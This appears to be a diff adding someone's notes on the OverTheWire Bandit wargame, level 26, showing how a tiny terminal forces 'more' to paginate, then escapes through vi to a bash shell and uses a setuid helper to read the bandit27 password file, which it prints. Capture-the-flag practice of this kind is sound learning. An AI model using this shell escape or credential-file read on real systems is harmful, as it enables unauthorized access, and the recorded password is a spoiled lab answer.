@@ -1,0 +1,30 @@
+The startup shell runs more on a file with 7 lines and immediately quit.
+ssh inherits the terminal from my linux laptop. If we set the height of this terminal to say 6
+lines, it forces the remote more to paginate.
+While it's paginating, you can run vi on the current line (by pressing v) and 
+from vi escape to shell.
+
+
+tim@astrazeek:~$ stty rows 6 && ssh -p 2220 bandit26@bandit.labs.overthewire.org -i apps/overthewire/bandit26.sshkey
+
+  _                     _ _ _   ___   __
+ | |                   | (_) | |__ \ / /
+ | |__   __ _ _ __   __| |_| |_   ) / /_
+ | '_ \ / _` | '_ \ / _` | | __| / / '_ \
+ | |_) | (_| | | | | (_| | | |_ / /| (_) |
+--More--(83%)
+
+Press v
+:set shell=/bin/bash
+:shell
+
+bandit26@bandit:~$ ls -l
+total 20
+-rwsr-x--- 1 bandit27 bandit26 14880 Jun 24 14:59 bandit27-do
+-rw-r----- 1 bandit26 bandit26   258 Jun 24 14:59 text.txt
+bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
+STJLJBRRphMxKB392CT4iOr5CbzPU9ER
+
+
+password for bandit27: STJLJBRRphMxKB392CT4iOr5CbzPU9ER
+
